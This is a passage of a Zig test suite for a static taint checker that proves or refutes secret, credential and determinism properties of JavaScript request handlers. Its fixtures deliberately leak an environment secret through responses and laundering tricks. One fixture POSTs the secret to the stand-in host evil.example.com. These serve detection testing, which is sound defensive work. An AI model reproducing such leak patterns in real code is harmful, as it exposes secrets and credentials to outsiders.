    try std.testing.expectEqual(@as(usize, 1), secret.count);
    try std.testing.expect(!secret.properties.no_secret_leakage);
    // The credential reached the same log node through the third call, so it
    // reports under its own kind and demotes its own property.
    const credential = try runFlowDiagnostics(std.testing.allocator, source, .credential_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), credential.count);
    try std.testing.expect(!credential.properties.no_credential_leakage);
}

test "FlowChecker unions routerMatch route return labels at dispatch" {
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { fetch } from "zttp:fetch";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function tainted(req) { return Response.json({ url: req.url }); }
        \\const routes = { "GET /clean": clean, "GET /tainted": tainted };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  const result = found.handler(req);
        \\  fetch("https://api.example.com/collect", { body: JSON.stringify(result) });
        \\  return Response.json({ ok: true });
        \\}
    ;
    const properties = try runFlowProperties(std.testing.allocator, source);
    try std.testing.expect(!properties.input_validated);
    try std.testing.expect(!properties.pii_contained);
}

test "FlowChecker proves every flow property for clean routerMatch routes" {
    const source =
        \\import { routerMatch } from "zttp:router";
        \\function first(req) { return Response.json({ route: "first" }); }
        \\const second = (req) => Response.text("second");
        \\let routes = { "GET /first": first, "GET /second": second };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  req.params = found.params;
        \\  return found.handler(req);
        \\}
    ;
    const properties = try runFlowProperties(std.testing.allocator, source);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(properties));
    }
}

test "FlowChecker isolates route witness IO from other roots" {
    const allocator = std.testing.allocator;
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { cacheGet } from "zttp:cache";
        \\import { env } from "zttp:env";
        \\function first(req) { cacheGet("ns", "key"); return Response.json({ ok: true }); }
        \\function second(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.json({ key: secret });
        \\}
        \\const routes = { "GET /first": first, "GET /second": second };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  return Response.json({ ok: true });
        \\}
    ;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;
    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    var found = false;
    for (checker.getDiagnostics()) |diag| {
        if (diag.kind != .secret_in_response) continue;
        found = true;
        const witness = diag.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), witness.io_calls.len);
        try std.testing.expectEqualStrings("env", witness.io_calls[0].func);
    }
    try std.testing.expect(!found);
    try std.testing.expect(checker.getProperties().no_secret_leakage);
    const dispatched =
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function second(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\const routes = { "GET /second": second };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    var diagnostic_text: [512]u8 = undefined;
    const report = try runFlowDiagnostics(allocator, dispatched, .secret_in_response, &diagnostic_text);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_secret_leakage);
    // The router selection is not yet encoded as request path evidence.
    // Refuse the leak without publishing an invented executable request.
    try std.testing.expectError(error.MissingWitness, secretWitnessJsonl(allocator, dispatched));
}

test "FlowChecker resolves finite callees and keeps unknown calls unproven" {
    const cases = [_][]const u8{
        // A function value received as a parameter.
        \\function invoke(callback) { return callback(); }
        \\function handler(req) { return Response.json({ value: invoke(req.callback) }); }
        ,
        // Member call on a parameter.
        \\function invoke(api) { return api.run(); }
        \\function handler(req) { return Response.json({ value: invoke(req.callback) }); }
        ,
        // The same value through a local alias.
        \\function invoke(api) { const alias = api; return alias.run(); }
        \\function handler(req) { return Response.json({ value: invoke(req.callback) }); }
        ,
        // A call result used as the next callee.
        \\function factory(req) { return req.callback; }
        \\function handler(req) { return Response.json({ value: factory(req)() }); }
        ,
        // A conditional selector whose result is called.
        \\function handler(req) { return Response.json({ value: (req.method === "GET" ? req.first : req.second)() }); }
        ,
        // A nullish selector whose result is called.
        \\function handler(req) { return Response.json({ value: (req.callback ?? req.other)() }); }
        ,
        // An arbitrary request property used as a method.
        \\function handler(req) { return Response.json({ value: req.callback() }); }
        ,
        // A finite literal method stays known through array selection.
        \\function handler(req) { return Response.json({ value: [{ run: () => "ok" }][0].run() }); }
        ,
        // A computed element used directly as the callee.
        \\function handler(req) { return Response.json({ value: [req.callback][0]() }); }
        ,
        // A computed object field used directly as the callee.
        \\function handler(req) { return Response.json({ value: ({ run: req.callback })["run"]() }); }
        ,
        // A finite literal callback stays known through dictionary storage.
        \\import { dictEmpty, dictSet, dictGet } from "zttp:collections";
        \\function handler(req) {
        \\  const callbacks = dictSet(dictEmpty(), "run", () => "ok");
        \\  return Response.json({ value: dictGet(callbacks, "run")() });
        \\}
        ,
        // A parsed object's arbitrary method is not a JSON intrinsic.
        \\function handler(req) { return Response.json({ value: JSON.parse("{}").run() }); }
        ,
        // Array methods that return elements or accumulator values are not arrays.
        \\function handler(req) { return Response.json({ value: [{ run: () => "ok" }].pop().run() }); }
        ,
        \\function handler(req) { return Response.json({ value: [{ run: () => "ok" }].reduce((a, x) => x).run() }); }
        ,
        // A module object return does not make every property a known method.
        \\import { urlParse } from "zttp:url";
        \\function handler(req) { return Response.json({ value: urlParse("https://example.com").run() }); }
        ,
        // An alias can replace a method on a mutable intrinsic receiver.
        \\function handler(req) {
        \\  const values = ["ok"];
        \\  const alias = values;
        \\  alias.join = req.callback;
        \\  return Response.json({ value: values.join() });
        \\}
        ,
    };
    for (cases, 0..) |source, index| {
        const properties = try runFlowProperties(std.testing.allocator, source);
        const resolved = index == 7 or index == 10 or index == 12 or index == 13;
        if (resolved != properties.no_secret_leakage or resolved != properties.no_credential_leakage or resolved != properties.deterministic) {
            std.debug.print("finite callee case {d}: {s}\nproperties={any}\n", .{ index, source, properties });
        }
        try std.testing.expectEqual(resolved, properties.no_secret_leakage);

        try std.testing.expectEqual(resolved, properties.no_credential_leakage);
        try std.testing.expectEqual(resolved, properties.deterministic);
    }
}

test "FlowChecker follows actual object and function replacements" {
    const clean =
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, clean)).no_secret_leakage);

    const mutated =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  api.run = () => env("SECRET_KEY");
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, mutated)).no_secret_leakage);

    const reassigned_function =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  let f = () => "ok";
        \\  f = () => env("SECRET_KEY");
        \\  return Response.json({ value: f() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, reassigned_function)).no_secret_leakage);

    const alias_mutated =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  const alias = api;
        \\  alias.run = () => env("SECRET_KEY");
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, alias_mutated)).no_secret_leakage);

    const aggregate_alias_mutated =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  const box = { api: api };
        \\  box.api.run = () => env("SECRET_KEY");
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, aggregate_alias_mutated)).no_secret_leakage);

    const call_escape_mutated =
        \\import { env } from "zttp:env";
        \\function mutate(api) { api.run = () => env("SECRET_KEY"); }
        \\function handler(req) {
        \\  const api = { run: () => "ok" };
        \\  mutate(api);
        \\  return Response.json({ value: api.run() });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, call_escape_mutated)).no_secret_leakage);
}

test "FlowChecker follows actual mutations and local routerMatch tables" {
    const cases = [_][]const u8{
        // A replaced type predicate can mutate the table passed to it.
        \\import { routerMatch } from "zttp:router";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
        \\Array.isArray = (table) => { table["GET /probe"] = () => Response.html("changed"); return false; };
        \\Array.isArray(routes);
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // Selecting the table from an aggregate retains a mutable alias.
        \\import { routerMatch } from "zttp:router";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
        \\const alias = [routes][0];
        \\alias["GET /probe"] = () => Response.html("changed");
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // The same aggregate selector can change the selected handler.
        \\import { routerMatch } from "zttp:router";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  const selected = [found][0];
        \\  selected.handler = () => Response.html("changed");
        \\  return found.handler(req);
        \\}
        ,
        // The table binding is immutable, but a property write changes runtime dispatch.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\const routes = { "GET /probe": clean };
        \\routes["GET /probe"] = leak;
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // Mutation through an alias also invalidates stable dispatch.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\const routes = { "GET /probe": clean };
        \\const alias = routes;
        \\alias["GET /probe"] = leak;
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // The selected result can itself be overwritten before dispatch.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  found.handler = () => Response.json({ key: env("SECRET_KEY") });
        \\  return found.handler(req);
        \\}
        ,
        // Reassignment replaces the initial route. Its unused egress body
        // must not contribute a sink to the actual clean dispatch.
        \\import { routerMatch } from "zttp:router";
        \\import { fetch } from "zttp:fetch";
        \\function send(req) {
        \\  fetch(req.url, { body: req.body ?? "" });
        \\  return Response.json({ ok: true });
        \\}
        \\function clean(req) { return Response.json({ ok: true }); }
        \\let routes = { "POST /send": send };
        \\routes = { "POST /send": clean };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // An aggregate can retain a mutable alias to the route table.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\const routes = { "GET /probe": clean };
        \\const box = { table: routes };
        \\box.table["GET /probe"] = leak;
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // Passing the table to an unknown function can mutate its routes.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\function mutate(table) { table["GET /probe"] = leak; }
        \\const routes = { "GET /probe": clean };
        \\mutate(routes);
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // An alias can overwrite the selected handler before dispatch.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /probe": clean };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  const selected = found;
        \\  selected.handler = () => Response.json({ key: env("SECRET_KEY") });
        \\  return found.handler(req);
        \\}
        ,
        // A function binding can change before the table captures it.
        \\import { routerMatch } from "zttp:router";
        \\import { env } from "zttp:env";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
        \\let route = clean;
        \\route = leak;
        \\const routes = { "GET /probe": route };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
        // A local table has the same callable behavior as a module table.
        \\import { routerMatch } from "zttp:router";
        \\function clean(req) { return Response.json({ ok: true }); }
        \\function handler(req) {
        \\  const routes = { "GET /probe": clean };
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
        ,
    };
    for (cases, 0..) |source, case_index| {
        const properties = try runFlowProperties(std.testing.allocator, source);
        const leaks = case_index == 3 or case_index == 4 or case_index == 5 or
            case_index == 7 or case_index == 8 or case_index == 9 or case_index == 10;
        inline for (std.meta.tags(FlowProperty)) |property| {
            const expected = !(leaks and property == .no_secret_leakage);
            if (property.holds(properties) != expected) {
                std.debug.print("router mutation case {d}, {s}: expected {}\n", .{ case_index, @tagName(property), expected });
                return error.TestUnexpectedFlowProperty;
            }
        }
    }
}

test "FlowChecker preserves known request string and rawJson calls" {
    const preview =
        \\export function handler(req) {
        \\  if (req.method !== "POST") {
        \\    return Response.json({ error: "method_not_allowed" }, { status: 405 });
        \\  }
        \\  const body = req.body ?? "";
        \\  if (body === "") {
        \\    return Response.json({ error: "body_required" }, { status: 400 });
        \\  }
        \\  const preview = body.slice(0, 8).toUpperCase();
        \\  return Response.json({ preview: preview });
        \\}
    ;
    const preview_properties = try runFlowProperties(std.testing.allocator, preview);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(preview_properties));
    }

    const routed_preview =
        \\import { routerMatch } from "zttp:router";
        \\function preview(req) {
        \\  const body = req.body ?? "";
        \\  const value = body.slice(0, 8).toUpperCase();
        \\  return Response.json({ preview: value });
        \\}
        \\const routes = { "POST /preview": preview };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    const routed_preview_properties = try runFlowProperties(std.testing.allocator, routed_preview);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(routed_preview_properties));
    }

    const inspected_array =
        \\function kindOf(value) { return match (value) { when array: "array" default: "other" }; }
        \\function handler(req) {
        \\  const document = [1, "two", true, null, [3]];
        \\  const kinds = document.map(kindOf);
        \\  return Response.json({ outer: kindOf(document), kinds: kinds });
        \\}
    ;
    const inspected_properties = try runFlowProperties(std.testing.allocator, inspected_array);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(inspected_properties));
    }

    const joined_array =
        \\function handler(req) { return Response.json({ value: ["a", "b"].map((x) => x).join("") }); }
    ;
    const joined_properties = try runFlowProperties(std.testing.allocator, joined_array);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(joined_properties));
    }

    const number_builtin =
        \\function handler(req) {
        \\  return Response.json({
        \\    integer: Number.isInteger(42),
        \\    nan: Number.isNaN(42),
        \\    finite: Number.isFinite(42),
        \\    int: Number.parseInt("42", 10),
        \\    float: Number.parseFloat("4.2"),
        \\  });
        \\}
    ;
    const number_properties = try runFlowProperties(std.testing.allocator, number_builtin);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(number_properties));
    }

    const request_string =
        \\function handler(req) { return Response.json({ part: req.url.slice(0, 2) }); }
    ;
    const request_properties = try runFlowProperties(std.testing.allocator, request_string);
    try std.testing.expect(request_properties.no_secret_leakage);
    try std.testing.expect(request_properties.deterministic);

    const routed_raw_json =
        \\import { routerMatch } from "zttp:router";
        \\function raw(req) { return Response.rawJson("{}"); }
        \\const routes = { "GET /raw": raw };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    const raw_properties = try runFlowProperties(std.testing.allocator, routed_raw_json);
    inline for (std.meta.tags(FlowProperty)) |property| {
        try std.testing.expect(property.holds(raw_properties));
    }
}

test "FlowChecker flags a credential in a hoisted egress options object" {
    // Inline, the `headers` extractor sees the credential. Hoisted into a
    // binding the options object is no longer a literal, so the per-field
    // extractors return empty and only the whole-object fallback runs - and it
    // routes to the egress body sink, which checks secret and user input but
    // never credential.
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const token = req.headers.authorization;
        \\  const opts = { headers: { authorization: token } };
        \\  fetch("https://api.example.com/v1", opts);
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!try runNoCredentialLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret produced by a closure argument" {
    // `inferLabels` had no arm for an arrow or function expression, so a
    // closure passed to a higher-order function contributed nothing and the
    // call's argument union came back empty - the positive claim that the
    // value carries no label. The secret rides out in the mapped array.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const keys = ["a", "b"].map(() => env("SECRET_KEY"));
        \\  return Response.json({ keys: keys });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through a helper chain past the summary depth" {
    // Nested zero-argument helpers put the `env` read past
    // `max_summary_depth`. The fallback used to be the union of the call's
    // arguments, which for a zero-argument call is empty, so the secret
    // arrived at the response carrying no label and the property held. It now
    // carries `.unknown` and the response sink refuses to prove.
    const source =
        \\import { env } from "zttp:env";
        \\function l10() { return env("SECRET_KEY"); }
        \\function l9() { return l10(); }
        \\function l8() { return l9(); }
        \\function l7() { return l8(); }
        \\function l6() { return l7(); }
        \\function l5() { return l6(); }
        \\function l4() { return l5(); }
        \\function l3() { return l4(); }
        \\function l2() { return l3(); }
        \\function l1() { return l2(); }
        \\function handler(req) { return Response.json({ v: l1() }); }
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker refuses to prove through a call it cannot resolve" {
    // `pick` is a parameter, so there is no body to walk. The old fallback
    // returned the argument union - empty here - which reads as the positive
    // claim that the value carries nothing.
    const source =
        \\function handler(req) {
        \\  const pick = req.pick;
        \\  return Response.json({ v: pick() });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker still proves a shallow helper chain" {
    // The conservative fallback must not swallow the ordinary case: a helper
    // the walk can enter, returning a value with no label, still proves.
    const source =
        \\function inner(x) { return x + 1; }
        \\function outer(x) { return inner(x) * 2; }
        \\function handler(req) { return Response.json({ v: outer(1) }); }
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through JSON.stringify in a response" {
    // A method-style call (member callee) must not strip taint labels off its
    // arguments: JSON.stringify(secret) reaching a response body leaks.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text(JSON.stringify({ pw: secret }));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through an array method in a response" {
    // The receiver of a method call carries taint too: [secret].join(",").
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text([secret].join(","));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through a string method in a response" {
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text(secret.slice(0));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through an optional method call in a response" {
    // `[secret]?.join(",")` - direct call through an optional receiver.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  return Response.text([secret]?.join(","));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through a const-bound arrow wrapper" {
    // A concise arrow `(x) => x` bound to a const is stored with a
    // `.return_stmt` body; the callee summary must collect its return value's
    // labels, not infer them on the return_stmt node (which yields empty and
    // launders the taint).
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const echo = (x) => x;
        \\  return Response.text(echo(secret));
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker flags a secret laundered through JSON.stringify into an egress body" {
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  fetch("https://evil.example.com", { method: "POST", body: JSON.stringify({ k: secret }) });
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "FlowChecker proves no_secret_leakage for benign method calls on untainted data" {
    // The conservative member-call union must only fire when a real taint label
    // is present: non-secret data through .join/.map stays clean (no false FP).
    const source =
        \\function handler(req) {
        \\  const items = ["a", "b", "c"];
        \\  return Response.text(items.join(","));
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "imported functions preserve secret provenance in both atom modes" {
    const allocator = std.testing.allocator;

    for ([_]bool{ true, false }) |use_atoms| {
        var parser = try @import("zts-engine").parser.JsParser.init(allocator,
            \\import { env } from "zttp:env";
            \\import { sha256 } from "zttp:crypto";
            \\import { thing } from "zttp-ext:unknown";
            \\function handler(req) { return Response.text(sha256(env("SECRET_KEY"))); }
        );
        defer parser.deinit();
        var atoms = atom_table.AtomTable.init(allocator);
        defer atoms.deinit();
        if (use_atoms) parser.setAtomTable(&atoms);
        const root = try parser.parse();
        const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

        var checker = FlowChecker.init(allocator, ir_view, if (use_atoms) &atoms else null);
        checker.scopes = &parser.scopes;
        defer checker.deinit();
        const handler = handler_function_mod.findHandlerFunction(ir_view, root) orelse
            return error.HandlerNotFound;
        try std.testing.expectEqual(@as(u32, 1), try checker.check(handler));
        try std.testing.expect(!checker.getProperties().no_secret_leakage);
        try std.testing.expectEqual(@as(usize, 1), checker.getDiagnostics().len);
        try std.testing.expectEqual(DiagnosticKind.secret_in_response, checker.getDiagnostics()[0].kind);
    }
}

test "an aliased env import preserves secrets beside an unresolved import" {
    const allocator = std.testing.allocator;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator,
        \\import { env as e } from "zttp:env";
        \\import { thing } from "zttp-ext:unknown";
        \\function handler(req) { return Response.text(e("SECRET_KEY")); }
    );
    defer parser.deinit();
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    const handler = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;
    try std.testing.expectEqual(@as(u32, 1), try checker.check(handler));
    try std.testing.expect(!checker.getProperties().no_secret_leakage);
    try std.testing.expectEqual(@as(usize, 1), checker.getDiagnostics().len);
    try std.testing.expectEqual(DiagnosticKind.secret_in_response, checker.getDiagnostics()[0].kind);
}

test "FlowChecker flags a secret carried in an array literal" {
    // Guards the `array_literal` arm of inferLabels: an array must merge its
    // elements' labels the way an object literal merges its members', or a
    // secret launders through one pair of brackets.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const bundle = [secret];
        \\  return Response.json({ leaked: bundle });
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker taints the base object through a member-access assignment" {
    // The statement form. `obj.field = secret;` parses as an expr_stmt wrapping
    // the assignment, so the label update in the `.assignment` arm never ran
    // and the mutated object read as clean at the response sink.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const out = {};
        \\  out.k = secret;
        \\  return Response.json(out);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "FlowChecker taints the base object through a computed-access assignment" {
    // `obj.field = secret` taints `obj`; `obj[key] = secret` walked to a
    // computed_access the root-binding walk had no arm for, so the label was
    // dropped entirely - the exact outcome that walk exists to prevent.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const out = {};
        \\  const key = "k";
        \\  out[key] = secret;
        \\  return Response.json(out);
        \\}
    ;

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind == .secret_in_response) found = true;
    }
    try std.testing.expect(found);
}

test "a clock-reading export labels its result nondeterministic" {
    // The export's clock capability must reach the public response verdict.
    const allocator = std.testing.allocator;
    const source =
        \\import { uuid } from "zttp:id";
        \\function handler(req) {
        \\  const id = uuid();
        \\  return Response.json({ id: id });
        \\}
    ;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().deterministic);
}

test "a capability-free export is not labelled nondeterministic" {
    const allocator = std.testing.allocator;
    const source =
        \\import { parseBearer } from "zttp:auth";
        \\function handler(req) {
        \\  const t = parseBearer(req.headers["authorization"] ?? "");
        \\  return Response.json({ present: t !== undefined });
        \\}
    ;
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(checker.getProperties().deterministic);
}

